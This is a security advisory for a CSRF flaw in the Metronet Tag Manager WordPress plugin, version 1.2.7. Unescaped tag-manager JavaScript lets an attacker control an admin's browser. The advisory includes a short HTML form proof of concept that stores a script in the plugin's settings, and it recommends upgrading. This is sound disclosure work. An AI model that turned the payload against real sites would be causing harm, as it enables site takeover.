Details

Software: Metronet Tag Manager
Version: 1.2.7
Homepage: https://wordpress.org/plugins/metronet-tag-manager/
Advisory report: https://advisories.dxw.com/advisories/csrf-metronet-tag-manager/
CVE: Awaiting assignment
CVSS: 5.8 (Medium; AV:N/AC:M/Au:N/C:P/I:P/A:N)

Description
================
CSRF in Metronet Tag Manager allows anybody to do almost anything an admin can

Vulnerability
================
The pluginas settings page sends a nonce, and checks it when displaying the success/failure message, but is not checked when setting options.
This option is meant to contain JavaScript for Google Tag Manager, so itas displayed on every frontend page without escaping.
As this vulnerability allows adding arbitrary JavaScript, the attacker can use it to control an admin useras browser to do almost anything an admin user can do.

Proof of concept
================
-->

Press submit on a page containing the following HTML snippet:
<form method=\"POST\" action=\"http://localhost/wp-admin/options-general.php?page=metronet-tag-manager\">
 <input type=\"text\" name=\"submit\" value=\"1\">
 <input type=\"text\" name=\"gtm-code-head\" value=\"<script>alert(1)</script>\">
 <input type=\"submit\">
</form>

<!--
In a real attack, the form can be made to autosubmit so the victim only has to follow a link.

Mitigations
================
Upgrade to version 1.2.9 or later.
